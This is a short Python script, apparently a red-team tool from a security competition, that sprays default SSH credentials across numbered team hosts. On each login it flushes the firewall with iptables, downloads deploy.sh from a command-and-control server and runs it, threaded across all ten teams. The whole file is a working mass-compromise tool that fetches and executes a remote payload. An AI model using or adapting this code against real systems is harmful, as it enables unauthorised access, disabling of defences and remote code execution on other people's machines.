import paramiko
import threading

C2 = 'http://10.22.0.87:8080'
HOSTS = ["10.21.{}.10", "web.team{}.bluebucket.irsec", "ftp.team{}.bluebucket.irsec"]
TEAMS = [num for num in xrange(1, 11)]
CREDS = [('root', 'changeme'), ('shop_admin', 'changeme'), ('data_admin', 'changeme')]

def rain(ip):
    """
        SSH's into the specified host and gets our deploy script and runs it

        :param ip: the ip of the host to ssh into
    """
    command = "sudo iptables -F; wget -O deploy.sh {}/deploy.sh;" \
                "chmod +x deploy.sh; sh deploy.sh".format(C2)

    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    for cred in CREDS:
        try:
            print ip, cred[0], cred[1]
            ssh.connect(ip, username=cred[0], password=cred[1], timeout=5)
            stdin, stdout, stderr = ssh.exec_command(command, get_pty=True)
            for line in stdout.readlines(): print line
            for line in stderr.readlines(): print line
            ssh.close()
            break

        except paramiko.AuthenticationException as e:
            print "Wrong creds - {}".format(e)
            continue

        except paramiko.SSHException as e:
            print "Other error - {}".format(e)
            continue


def storm(team):
    """
        Makes it rain on a specific team

        :param team: the team number
    """
    for host in HOSTS:
        formatted_host = host.format(team)
        host_thread = threading.Thread(target=rain, args=(formatted_host,))
        host_thread.start()


if __name__ == '__main__':
    for team in TEAMS:
        team_thread = threading.Thread(target=storm, args=(team,))
        team_thread.daemon = True
        team_thread.start()

